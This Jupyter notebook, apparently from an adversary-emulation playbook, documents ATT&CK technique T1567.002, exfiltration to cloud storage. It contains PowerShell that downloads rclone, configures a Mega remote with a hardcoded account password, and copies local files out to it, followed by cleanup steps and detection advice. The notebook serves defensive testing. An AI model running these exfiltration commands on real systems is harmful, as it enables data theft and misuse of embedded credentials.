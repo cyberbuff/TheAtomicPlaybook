{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "974f7e28",
   "metadata": {},
   "source": "# T1567.002 - Exfiltration to Cloud Storage\nAdversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. "
  },
  {
   "cell_type": "markdown",
   "id": "a8ecc7a0",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "33c9ce27",
   "metadata": {},
   "source": "### Atomic Test #1 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)\nThis test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: rclone must exist at (#{rclone_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\T1567.002\\rclone-v*\\) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile $env:temp\\rclone.zip\nExpand-archive -path $env:temp\\rclone.zip -destinationpath $env:temp\\T1567.002\\ -force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "124d6ce0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1567.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c9af0546",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item $env:appdata\\rclone -ItemType directory\nNew-Item $env:appdata\\rclone\\rclone.conf\ncd $env:temp\\T1567.002\\rclone-v*\\\n.\\rclone.exe config create T1567002 mega\nset-Content $env:appdata\\rclone\\rclone.conf \"[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA\"\n.\\rclone.exe copy --max-size 1700k $env:temp\\T1567.002 T1567002:test -v\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80e0c3f0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1567.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "4d9448e3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncd $env:temp\\T1567.002\\rclone-v*\\\n.\\rclone.exe purge T1567002:test\n.\\rclone.exe config delete T1567002:\nRemove-Item $env:appdata\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item $env:temp\\rclone.zip\nRemove-Item $env:temp\\T1567.002 -recurse -force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e57f13cb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1567.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a848de47",
   "metadata": {},
   "source": "## Detection\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}